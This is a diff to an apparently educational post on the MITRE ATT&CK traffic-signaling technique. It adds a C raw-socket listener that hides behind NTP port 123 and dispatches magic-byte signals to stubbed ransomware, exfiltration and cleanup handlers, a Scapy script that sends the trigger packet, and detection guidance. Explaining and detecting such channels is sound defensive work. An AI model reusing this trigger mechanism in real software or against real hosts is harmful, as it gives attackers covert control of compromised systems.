@@ -31,15 +31,80 @@ One method adversaries have used to signal to the listening malware is Port Knoc
 
 ### Socket Filters
 
-Another way to send signals is by filtering for crafted packets with unusual characteristics or "magic bytes" embedded in the data. The payload may carry different signals, allowing additional control.
+Another way to send signals is by filtering for crafted packets with unusual characteristics or "magic bytes" embedded in the data. The payload may carry different signals, allowing additional control. In the following scenario, a program uses a raw socket to filter for inbound UDP packets on port 123 (NTP). When a "password" byte chunk is detected, the following ten bytes will signal which action the program should take.
 
-___pick excerpt from filter___
-___create scapy program to send to filter___
+~~~
+// UDP port 123 packet received, checking data for signals
+void check_byte_pattern(const char* udpData, int length) {
+    const unsigned char passwordChunk[] = { 0x3A, 0xF1, 0xD2, 0x84, 0xB7, 0xC9, 0x5E, 0x6F, 0x12, 0xA3 };
+    const int passLength = sizeof(passwordChunk);
 
-### Defensive Measures
+    const unsigned char signal1[] = { 0x7B, 0x8C, 0x2D, 0x5F, 0xE6, 0x91, 0x4A, 0x0D, 0xF3, 0xC8 };
+    const unsigned char signal2[] = { 0x1E, 0xA7, 0x9B, 0x05, 0xD4, 0x8F, 0x36, 0xC2, 0x7D, 0xE9 };
+    const unsigned char signal3[] = { 0x52, 0xF8, 0x3C, 0x6B, 0x94, 0x0A, 0xE1, 0xD7, 0x2F, 0x8E };
 
+    // Search every 10 byte chunk in the UDP data
+    for (int i = 0; i <= length - passLength; i++) {
+        // If the 10 byte chunk matches the passwordChunk
+        if (memcmp(udpData + i, passwordChunk, passLength) == 0) {
+            // If there are at least 10 more bytes after the target pattern
+            if (i + passLength + 10 <= length) {
+                printf("  Signal detected: ");
+                print_hex(passwordChunk, passLength);
 
+                printf("  Next ten bytes: ");
+                print_hex((const unsigned char*)(udpData + i + passLength), 10);
+
+                if (memcmp(udpData + i + passLength, signal1, 10) == 0) {
+                    clean_presence();
+                }
+                else if (memcmp(udpData + i + passLength, signal2, 10) == 0) {
+                    deploy_ransomware();
+                }
+                else if (memcmp(udpData + i + passLength, signal3, 10) == 0) {
+                    exfiltrate_data();
+                }
+            }
+            break;
+        }
+    }
+}
+~~~
+{: .language-c}
+
+The following Python script sends a UDP packet with the byte combo needed to trigger the `exfiltrate_data` method.
+
+~~~
+from scapy.all import IP, UDP, Raw, send
+import random
+
+target_ip = "192.168.56.1"
+target_port = 123
+
+payload = bytes([
+    0x3A, 0xF1, 0xD2, 0x84, 0xB7, 0xC9, 0x5E, 0x6F, 0x12, 0xA3,
+    0x52, 0xF8, 0x3C, 0x6B, 0x94, 0x0A, 0xE1, 0xD7, 0x2F, 0x8E
+])
+
+prefix = bytes([random.randint(0, 255) for _ in range(random.randint(10, 20))])
+suffix = bytes([random.randint(0, 255) for _ in range(random.randint(10, 20))])
+final_payload = prefix + payload + suffix
+
+packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=final_payload)
+send(packet, verbose=1)
+~~~
+{: .language-python}
+
+{% include image.html url="/images/trafficsignaling/socket_filter.png" description="Socket filter received signal to exfiltrate data" percentage="80" %}
+
+### Detective Measures
+
+Monitor network traffic for abnormal connection combinations that do not follow standard flow patterns. Behavioral analytics solutions and stateful firewalls can perform some of this analysis. Create detections around malformed packets that do not conform to their destination port's application protocols. This may assist in finding covert signals attempting to blend in.
+
+Alert on untrusted programs that create raw sockets (`AF_INET`,`SOCK_RAW`) or use packet filter libraries. On Windows, detect NDIS (Network Driver Interface Specification) driver installations using the `Get-NetAdapterBinding` PowerShell Cmdlet and monitor for `PF_PACKET` sockets on Linux.
 
 ## References
 
 - [MITRE ATT&CK - Traffic Signaling](https://attack.mitre.org/techniques/T1205/)
+- [MITRE ATT&CK - Port Knocking](https://attack.mitre.org/techniques/T1205/001/)
+- [MITRE ATT&CK - Socket Filters](https://attack.mitre.org/techniques/T1205/002/)
